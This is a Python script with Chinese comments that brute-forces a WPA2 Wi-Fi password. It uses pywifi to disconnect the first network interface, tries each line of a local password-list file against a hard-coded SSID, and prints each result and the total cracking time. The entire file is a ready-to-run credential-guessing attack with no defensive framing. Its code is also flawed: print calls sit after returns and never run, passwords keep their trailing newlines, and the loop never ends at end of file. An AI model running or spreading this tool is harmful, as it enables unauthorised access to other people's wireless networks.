import pywifi
from pywifi import const  # 引入常量
import time
import datetime
"""
1. 抓取第一个网卡
2. 断开wifi连接
3. 从密码本读取密码，不断去试
4. 设置睡眠时间， 3秒
"""

# ssid名称, 密码
def wificonnect(wifiname, wifipwd):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]

    #断开wifi连接
    ifaces.disconnect()
    time.sleep(0.5)

    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()                          #配置文件
        profile.ssid = wifiname                       #wifi名称
        profile.auth = const.AUTH_ALG_OPEN                  #需要密码
        profile.akm.append(const.AKM_TYPE_WPA2PSK)          #加密类型
        profile.cipher = const.CIPHER_TYPE_CCMP             #加密单元
        profile.key = wifipwd                           #wifi密码
    
        ifaces.remove_all_network_profiles()                #删除所有其它配置文件
        tmp_profile = ifaces.add_network_profile(profile)   #加载新的配置文件
        ifaces.connect(tmp_profile)                          #连接wifi
        time.sleep(10)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
            print("connect successfully!")
        else:
            return False
            print("connect failed!")

# 获取密码
def read_pwd(filepath,wifiname):
    print("破解密码开始：")
    path = filepath
    file = open(path,'r')
    start = datetime.datetime.now()
    while True:
        try:
            wifipwd = file.readline()
            bool = wificonnect(wifiname,wifipwd)
            if bool:
                print(f"密码正确：{wifipwd}")
                break; #break 只能停止一层循环
            else:
                print(f"密码错误：{wifipwd}")
        except:
            continue 
    end = datetime.datetime.now()
    print(f"本次破解wifi使用时间：{end - start}")
read_pwd(r"G:\python\wifi\possword.txt",'TP-LINK_73EA')    